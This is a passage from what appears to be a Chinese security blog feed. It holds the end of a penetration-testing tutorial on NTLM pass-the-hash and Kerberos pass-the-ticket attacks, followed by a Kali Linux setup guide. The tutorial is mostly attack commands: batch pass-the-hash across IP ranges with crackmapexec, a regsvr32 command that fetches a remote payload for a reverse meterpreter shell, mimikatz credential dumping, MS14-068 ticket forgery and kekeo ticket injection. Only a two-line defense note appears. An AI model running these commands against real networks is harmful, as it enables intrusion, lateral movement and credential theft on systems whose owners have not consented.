operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>crackmapexec<span class="token number">-4.0</span><span class="token punctuation">.</span><span class="token number">1.</span>dev0<span class="token operator">-</span>py2<span class="token number">.7</span><span class="token punctuation">.</span>egg<span class="token operator">/</span>cme<span class="token operator">/</span>modules</code></pre><p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p><pre class=" language-bash"><code class="language-bash">$ cme smb -M met_inject --options<span class="token punctuation">[</span>*<span class="token punctuation">]</span> met_inject module options:    LHOST    IP hosting the handler    LPORT    Handler port    PAYLOAD  Payload to inject: reverse_http or reverse_https <span class="token punctuation">(</span>default:reverse_https<span class="token punctuation">)</span>    PROCID   Process ID to inject into <span class="token punctuation">(</span>default: current powershell process<span class="token punctuation">)</span></code></pre><p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p><pre><code>cme smb 17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o LHOST=17.10.0.1 LPORT=9999</code></pre><p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p><p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p><pre class=" language-bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token keyword">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token keyword">set</span> LHOST 17.10.0.1<span class="token keyword">set</span> LPORT 9999<span class="token keyword">set</span> target 3run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job 0.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 17.10.0.1:9999 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://0.0.0.0:8080/1KZkey<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Local IP: http://10.204.146.152:8080/1KZkey<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token function">command</span> on the target machine:regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</code></pre><p>通过pass-the-hash执行命令批量getshell</p><pre class=" language-bash"><code class="language-bash">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="token string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></code></pre><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203201319.png" alt=""></p><h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h3><p>search <code>psexec</code>，<code>smblogin</code></p><pre class=" language-bash"><code class="language-bash">use exploit/windows/smb/psexec <span class="token keyword">set</span> payload windows/meterpreter/bind_tcp<span class="token keyword">set</span> RHOST 17.10.0.10<span class="token keyword">set</span> smbuser administrator<span class="token keyword">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBFexploituse exploit/windows/smb/psexec_psh<span class="token keyword">set</span> payload windows/meterpreter/bind_tcp<span class="token keyword">set</span> RHOST 17.10.0.10<span class="token keyword">set</span> smbuser administrator<span class="token keyword">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</code></pre><p>举例：</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203212818.png" alt=""></p><h3 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h3><p>先抓取hash</p><pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">""</span>privilege::debug<span class="token string">""</span> <span class="token string">""</span>sekurlsa::logonpasswords<span class="token string">""</span></code></pre><p>得到hash之后：</p><pre class=" language-bash"><code class="language-bash">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</code></pre><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h3><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p><p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p><p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p><p>只能说很多工具吧，比较好用的在这里介绍两种：</p><p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p><pre class=" language-bash"><code class="language-bash">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="token string">"whoami"</span></code></pre><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204094217.png" alt=""></p><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p><pre class=" language-powershell"><code class="language-powershell">Invoke<span class="token operator">-</span>WMIExec <span class="token operator">-</span>Target 17<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>10 <span class="token operator">-</span>Domain test<span class="token punctuation">.</span>local <span class="token operator">-</span>Username test1 <span class="token operator">-</span>Hash AFC44EE7351D61D00698796DA06B1EBF <span class="token operator">-</span>Command <span class="token string">"calc.exe"</span> <span class="token operator">-</span>verbose</code></pre><p>Invoke-SMBExec</p><p>通过在目标主机创建服务执行命令，所以权限为system</p><pre class=" language-powershell"><code class="language-powershell">Invoke<span class="token operator">-</span>SMBExec <span class="token operator">-</span>Target 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2 <span class="token operator">-</span>Domain ssookinging<span class="token operator">-</span>pc <span class="token operator">-</span>Username test1 <span class="token operator">-</span>Hash 7ECFFFF0C3548187607A14BAD0F88BB1 <span class="token operator">-</span>Command <span class="token string">"calc.exe"</span> <span class="token operator">-</span>verbose</code></pre><p><strong>Invoke-SMBClient：</strong></p><p>支持SMB1, SMB2 (2.1), and SMB signing</p><p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p><p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p><pre class=" language-bash"><code class="language-bash">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="token string">"notepad.exe"</span> -verbose</code></pre><h3 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h3><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p><pre class=" language-bash"><code class="language-bash">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exepth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</code></pre><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png" alt=""></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h2><p>引用自<a href="[http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/](http://xnianq.cn/2018/10/16/域渗透之横向移动/">原文</a></p><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：</p><ul><li>MS14-068</li><li>Golden ticket</li><li>SILVER TICKET</li></ul><p>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p><ul><li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li><li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</li><li>然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测</li><li><p>检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。</p></li><li><h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><blockquote><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p></blockquote></li></ul><p>这里不得不说walkerfuz表哥写的这篇分析文章：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a> 最详细的分析，没有之一，向表哥学习！我用最简单的语言表达一下:</p><pre class=" language-bash"><code class="language-bash">windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。1. 在请求AS时，将require_PAC设置成False。2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）</code></pre><p>利用过程：<br>1.whoami/user 得到普通域用户的sid</p><p>2.执行payload生成ccache:</p><pre class=" language-bash"><code class="language-bash">MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200</code></pre><p>3.使用mimikatz注入凭据:</p><pre class=" language-bash"><code class="language-bash">kerberos::purge <span class="token comment" spellcheck="true">#清空当前机器存在的凭证</span>kerberos::ptc y:\downloads\TGT_yifan@test.local.ccache</code></pre><p>显示Injecting ticket : OK就表示注入成功了～</p><p>4.查看注入是否成功并且登录域控：</p><p>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。</p><p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket。Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">地址</a>。参数实例：</p><pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"</span></code></pre><p>执行后生成票据</p><pre class=" language-bash"><code class="language-bash">TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi</code></pre><p>接下来导入票据：</p><pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"</span></code></pre><h1 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h1><p>结合攻击方法，总结防御思路如下：<br>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径<br>如无特殊需要，建议配置防火墙规则禁止139和445端口</p><h1 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h1><ul><li>内网欺骗劫持</li><li>钓鱼文件</li><li>后门命令</li><li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li><li><p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></p></li><li><p>获取域控</p></li></ul><pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> run post/windows/gather/credentials/gpp</code></pre><p><strong>参考链接</strong></p><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/microsoft-ntlm" target="_blank" rel="noopener">Microsoft NTLM</a></li><li><a href="http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html" target="_blank" rel="noopener">http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html</a></li><li><a href="https://www.freebuf.com/articles/database/70395.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/70395.html</a></li><li><a href="https://blog.csdn.net/qq_27446553/article/details/73635108" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/73635108</a></li><li><a href="https://zhidao.baidu.com/question/1845749.html" target="_blank" rel="noopener">工作组和域的区别</a></li><li><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">彻底理解Windows认证</a></li><li><a href="https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html" target="_blank" rel="noopener">Windows安全认证是如何进行的？[NTLM篇]</a></li><li><a href="https://blog.csdn.net/yangxin114/article/details/8112018" target="_blank" rel="noopener">Windows下的身份验证—-NTLM和Kerberos</a></li><li><a href="http://xnianq.cn/2018/10/16/域渗透之横向移动/" target="_blank" rel="noopener">域渗透之横向移动</a></li><li><a href="https://blog.csdn.net/pyphrb/article/details/52051321" target="_blank" rel="noopener">https://blog.csdn.net/pyphrb/article/details/52051321</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/" target="_blank" rel="noopener">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash/" target="_blank" rel="noopener">渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash</a></li><li><a href="https://blog.csdn.net/Fly_hps/article/details/80641938" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80641938</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 攻防渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> NTML-Hash </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali Rolling安装之后的一些常用配置总结</title>
      <link href="/kali-rolling-an-zhuang-zhi-hou-de-yi-xie-chang-yong-pei-zhi-zong-jie/"/>
      <url>/kali-rolling-an-zhuang-zhi-hou-de-yi-xie-chang-yong-pei-zhi-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>添加普通用户</p><pre class=" language-bash"><code class="language-bash"><span class="token function">useradd</span> -m -G sudo,video,audio,cdrom -s /bin/bash ssooking</code></pre><p>把某个用户添加到组中: <code>sudo usermod -a 用户名 -G 组名</code><br>递归更改目录/文件所属用户组： <code>sudo chgrp 用户名 -R MyDocuments/</code><br>递归更改目录/文件拥有者：<code>sudo chown  用户名 -R MyDocuments/</code></p><h1 id="一、更新升级"><a href="#一、更新升级" class="headerlink" title="一、更新升级"></a>一、更新升级</h1><h2 id="1-添加源："><a href="#1-添加源：" class="headerlink" title="1.添加源："></a>1.添加源：</h2><p><code>vi /etc/apt/sources.list</code>，比较好用的kali源</p><pre class=" language-bash"><code class="language-bash">deb http://http.kali.org/kali kali-rolling main non-free contribdeb http://mirrors.aliyun.com/debian stable main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><p>如果是其他系统导入kali源，比如<code>ubuntu</code>，需要导入kali公钥</p><pre class=" language-bash"><code class="language-bash">apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6</code></pre><h2 id="2-更新软件列表并更新软件"><a href="#2-更新软件列表并更新软件" class="headerlink" title="2.更新软件列表并更新软件"></a>2.更新软件列表并更新软件</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;</span> <span class="token function">apt-get</span> upgrade -y</code></pre><h2 id="3-升级操作系统"><a href="#3-升级操作系统" class="headerlink" title="3.升级操作系统"></a>3.升级操作系统</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> dist-upgrade -y</code></pre><p> 如果软件包更新过程中临时中断，可以使用修复命令：</p><pre class=" language-bash"><code class="language-bash">dpkg --configure -a</code></pre><h2 id="4-安装内核头文件"><a href="#4-安装内核头文件" class="headerlink" title="4.安装内核头文件"></a>4.安装内核头文件</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> linux-headers-<span class="token variable"><span class="token variable">$(</span> <span class="token function">uname</span> -r <span class="token variable">)</span></span></code></pre><p>清理系统软件包和内核：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">uname</span> –r 查看正在使用的内核dpkg --get-selections <span class="token operator">|</span> <span class="token function">grep</span> linux</code></pre><p>删除不用的内核文件image、头文件headers：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> purge 内核文件名 头文件名 </code></pre><h2 id="5-清理系统"><a href="#5-清理系统" class="headerlink" title="5.清理系统"></a>5.清理系统</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> clean <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> autoclean <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> autoremove -y　　</code></pre><p>详解：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> remove 软件名 　　<span class="token comment" spellcheck="true">#删除相应的软件,但保留配置文件</span><span class="token function">apt-get</span> purge 软件名 　　 <span class="token comment" spellcheck="true">#同时清除软件包和软件的配置文件</span><span class="token function">apt-get</span> clean 　　　　　　<span class="token comment" spellcheck="true">#删除软件包缓存（/var/cache/apt/archives）</span><span class="token function">apt-get</span> autoremove 　　　<span class="token comment" spellcheck="true">#自动清理无用的依赖包</span></code></pre><p>清理系统残存配置:</p><pre class=" language-bash"><code class="language-bash">dpkg -l <span class="token operator">|</span><span class="token function">grep</span> ^rc<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span><span class="token function">sudo</span> <span class="token function">xargs</span> dpkg -P</code></pre><h1 id="二、安装常用工具"><a href="#二、安装常用工具" class="headerlink" title="二、安装常用工具"></a>二、安装常用工具</h1><h2 id="谷歌拼音"><a href="#谷歌拼音" class="headerlink" title="谷歌拼音"></a>谷歌拼音</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> fcitx fcitx-googlepinyin</code></pre><p>安装完毕后重启生效，打开<code>Fcitx Configuration</code></p><p>点左下角那个“+” ，–&gt; 去掉”仅显示当前语言”的勾 –&gt; 找到“googlepinyin”并添加。默认使用<code>ctrl+空格</code>切换中英文输入法</p><h2 id="截图工具flameshot"><a href="#截图工具flameshot" class="headerlink" title="截图工具flameshot"></a>截图工具flameshot</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> flameshotflameshot config    <span class="token comment" spellcheck="true">#配置flameshot</span>flameshot gui        <span class="token comment" spellcheck="true">#截图</span></code></pre><p>去掉最后几项，这样截图界面会清爽很多。</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201135141.png" alt=""></p><p>在<code>系统设置</code>—<code>Keyboard</code>设置中添加快捷键</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201135343.png" alt=""></p><p>使用<code>Ctrl+Alt+A</code>快捷键截图试试</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201135803.png" alt=""></p><h2 id="增加vpn支持"><a href="#增加vpn支持" class="headerlink" title="增加vpn支持"></a>增加vpn支持</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome</code></pre><h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> zshsh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span>2chsh -s /bin/zsh</code></pre><h2 id="使用蓝牙"><a href="#使用蓝牙" class="headerlink" title="使用蓝牙"></a>使用蓝牙</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> pi-bluetooth bluez bluez-firmware blueman</code></pre><p>关键一点：添加pi用户到蓝牙组</p><pre class=" language-bash"><code class="language-bash"><span class="token function">usermod</span> -G bluetooth -a pi<span class="token function">usermod</span> -G bluetooth -a 用户名</code></pre><h2 id="一些必备工具"><a href="#一些必备工具" class="headerlink" title="一些必备工具"></a>一些必备工具</h2><p>下面介绍一些<strong><code>非常好用</code></strong>的工具，<code>apt</code>可以直接安装</p><ul><li><p><code>peek</code>：GIF录制</p></li><li><p><code>catfish</code>：文件快速搜素工具，类似windows上的<code>Everything</code></p></li><li><p><code>bless</code>：图形化的16进制编辑器</p></li><li><p><code>bleachbit</code>：图形化垃圾清理工具</p></li><li><p><code>remmina</code>：远程连接管理工具</p></li><li><p><code>filezilla</code>：FTP客户端</p></li><li><p><code>cherrytree</code>：本地知识树笔记工具</p></li><li><p><code>synapse</code>：系统应用程序快速启动工具</p></li></ul><p>其他值得独立安装的工具</p><ul><li><a href="http://www.wps.cn/product/wpslinux/" target="_blank" rel="noopener">wps</a>：office办公</li><li><a href="https://github.com/askme765cs/Wine-QQ-TIM" target="_blank" rel="noopener">QQ/TIM</a>：appimage版qq和tim</li><li><strong>Wechat</strong>：<a href="https://github.com/trazyn/weweChat" target="_blank" rel="noopener">weweChat</a> 、<a href="https://github.com/geeeeeeeeek/electronic-wechat" target="_blank" rel="noopener">electronic-wechat</a></li><li><a href="https://www.typora.io/" target="_blank" rel="noopener">typora</a>：markdown编辑器</li><li><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">sublime text 3</a>：代码编辑器</li><li><a href="https://github.com/oguzhaninan/Stacer" target="_blank" rel="noopener">stacer</a>：图形化系统优化管理工具</li><li><a href="https://plot.ly/free-sql-client-download/" target="_blank" rel="noopener">Falcon SQL Client</a>：支持多种数据库的连接管理工具</li><li><a href="https://meetfranz.com/" target="_blank" rel="noopener">Franz</a>：能够同时登录多个Mail、云盘、社交帐号等（基于web）的工具</li><li><a href="https://getstation.com/" target="_blank" rel="noopener">Station</a>：类似Franz，能够在一个软件中登录管理多个帐号，界面更好看</li></ul><p>更多工具：<a href="https://www.linux-apps.com/" target="_blank" rel="noopener">https://www.linux-apps.com/</a></p><h1 id="三、系统美化"><a href="#三、系统美化" class="headerlink" title="三、系统美化"></a>三、系统美化</h1><p>全局设置:</p><ul><li>主题文件： /usr/share/themes/    </li><li>图标文件： /usr/share/icons/            </li><li>背景壁纸： /usr/share/background/ 、 /usr/share/wallpapers</li><li>conky ： /etc/conky/</li></ul><h2 id="1-修改背景图片"><a href="#1-修改背景图片" class="headerlink" title="1.修改背景图片"></a>1.修改背景图片</h2><p><code>/usr/share/images/desktop-base</code></p><pre class=" language-bash"><code class="language-bash">login-background.png　<span class="token comment" spellcheck="true">#进入系统界面的背景图</span>kali-grub.png　　　　　<span class="token comment" spellcheck="true">#grub的背景图片(/usr/share/images/desktop-base)</span>kali-wallpaper_1024×786 <span class="token comment" spellcheck="true">#类似的都是桌面背景图</span></code></pre><p>修改登录界面图片</p><pre class=" language-bash"><code class="language-bash">/usr/share/gnome-shell/theme/KaliLogin.png  /usr/share/images/desktop-base  desktop-grub.png  kali-grub.png</code></pre><h2 id="2-修改主题"><a href="#2-修改主题" class="headerlink" title="2.修改主题"></a>2.修改主题</h2><p>主题文件位置：</p><p>gnome主题网站： <a href="https://www.gnome-look.org/" target="_blank" rel="noopener">gnome-look.org</a> </p><h3 id="选择GTK主题"><a href="#选择GTK主题" class="headerlink" title="选择GTK主题"></a>选择GTK主题</h3><p>去 <a href="https://www.gnome-look.org/browse/cat/135/" target="_blank" rel="noopener">gnome-look.org</a> 网站下载喜欢的<code>GTK</code>主题。这里我用的是<a href="https://www.opendesktop.org/p/1263666/" target="_blank" rel="noopener">McOS-MJV-Gnome-3.30</a> ，把下载的theme包解压到<code>/usr/share/themes</code>下。</p><h3 id="选择图标icons主题"><a href="#选择图标icons主题" class="headerlink" title="选择图标icons主题"></a>选择图标icons主题</h3><p>这里我使用的是：<a href="https://www.opendesktop.org/p/1256209/" target="_blank" rel="noopener">Korla icon theme</a> ，下载完后，把图标主题包解压到<code>/usr/share/icons</code>下。</p><h3 id="选择鼠标主题"><a href="#选择鼠标主题" class="headerlink" title="选择鼠标主题"></a>选择鼠标主题</h3><p><a href="https://www.gnome-look.org/browse/cat/107/" target="_blank" rel="noopener">Cursors主题下载</a> ，这里我用的是<a href="https://www.opendesktop.org/p/999353/" target="_blank" rel="noopener">Breeze Black</a> ,下载完后，把鼠标主题解压到<code>/usr/share/icons</code>下。</p><p>打开<code>gnome-tweaks</code>，在外观处选择对应主题</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201142929.png" alt=""></p><p>默认的窗口按钮在右边，gnome环境下，将其换到左边的命令为：</p><pre class=" language-bash"><code class="language-bash">gsettings <span class="token keyword">set</span> org.gnome.desktop.wm.preferences button-layout <span class="token string">'close,maximize,minimize:'</span></code></pre><p>整体效果</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/kali.png" alt=""></p><p> 除了基本美化，还可以使用<code>conky</code>进行美化。</p><h2 id="3-添加gnome插件"><a href="#3-添加gnome插件" class="headerlink" title="3.添加gnome插件"></a>3.添加gnome插件</h2><p>gnome提供了很多插件，用于丰富gnome功能，我们可以根据需要添加 <a href="https://extensions.gnome.org/" target="_blank" rel="noopener">gnome extensions</a>来拓展功能。但是插件装的太多，会比较卡。插件存放路径：<code>~/.local/share/gnome-shell/extensions/</code>。</p><p>每次装完插件，我们可以按下<code>Alt+F2</code>— 输入<code>r</code>—回车 ，以此重启刷新gnome。</p><p>下面是一些插件举例：</p><ul><li><code>AlternateTab</code>     Alt+Tab切换应用 </li><li><code>Coverflow Alt-Tab</code>  功能与AlternateTab相同，但提供了一个更酷炫的界面 </li><li><code>Applications Menu</code>  顶栏显示应用菜单，我比较少用，但刚从Windows切换过来的或许需要 </li><li><code>Auto Move Windows</code>   当应用创建窗口时自动移动到某个特定的工作空间 </li><li><code>Caffeine</code>    取消自动锁屏 </li><li><code>Clipboard Indicator</code>  剪贴板管理 </li><li><code>Dash to Dock</code>不解释 </li><li><code>EasyScreenCast</code>屏幕录像，做演示时比较方便 （kali默认安装）</li><li><code>Screenshot Tool</code>屏幕截图工具，也具有一些简单的图片编辑功能 </li><li><code>Sound Input &amp; Output Device Chooser</code> 更为方便地调节音量 </li><li><code>Gnomodoro</code>简易番茄钟 </li><li><code>Time ++</code> 番茄钟，Todo-list，计时器等 </li><li><code>Hide Top Bar</code> 全屏时自动隐藏顶栏</li><li><code>Lock Keys</code> 顶栏显示Numlock和Capslock的状态 </li><li><code>NetSpeed</code> 顶栏显示网速，喜欢简洁的Simple net speed也非常不错 </li><li><code>OpenWeather</code>顶栏显示天气情况，gnome自带的weather不支持顶栏显示，用起来不方便 </li><li><code>Places Status Indicator</code>为一些常用目录提供快速入口 </li><li><code>system-monitor</code>  顶栏显示CPU、内存、网速、温度、电池电量等信息，安装前需要解决依赖</li></ul><h1 id="四、优化设置"><a href="#四、优化设置" class="headerlink" title="四、优化设置"></a>四、优化设置</h1><h2 id="自定义快捷键延时截图"><a href="#自定义快捷键延时截图" class="headerlink" title="自定义快捷键延时截图"></a>自定义快捷键延时截图</h2><pre class=" language-bash"><code 